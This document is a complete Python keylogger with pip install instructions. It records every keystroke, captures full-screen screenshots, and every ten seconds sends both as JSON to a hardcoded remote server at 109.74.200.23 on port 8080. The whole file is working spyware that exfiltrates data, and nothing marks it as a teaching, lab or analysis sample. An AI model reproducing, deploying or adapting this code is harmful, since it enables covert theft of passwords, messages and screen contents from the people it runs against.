# Install the required packages using the following commands:
# pip install pynput
# pip install requests
# pip install pillow

from pynput import keyboard
import requests
import json
import threading
from PIL import ImageGrab
import base64
import io

text = ""

ip_address = "109.74.200.23"
port_number = "8080"
time_interval = 10

def take_screenshot():
    # Capture the screen
    screenshot = ImageGrab.grab()
    # Save the screenshot to a bytes buffer in PNG format
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    # Encode the image as base64 to send as a string
    img_str = base64.b64encode(buffer.getvalue()).decode()
    return img_str

def send_post_req():
    global text

    try:
        # Take a screenshot and get it as a base64 string
        screenshot = take_screenshot()

        # Prepare the payload with both keyboard data and screenshot
        payload = json.dumps({
            "keyboardData": text,
            "screenshot": screenshot
        })

        # Send the POST request to the server
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})

        # Reset the text after sending
        text = ""

        # Schedule the next execution
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()

    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.esc]:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
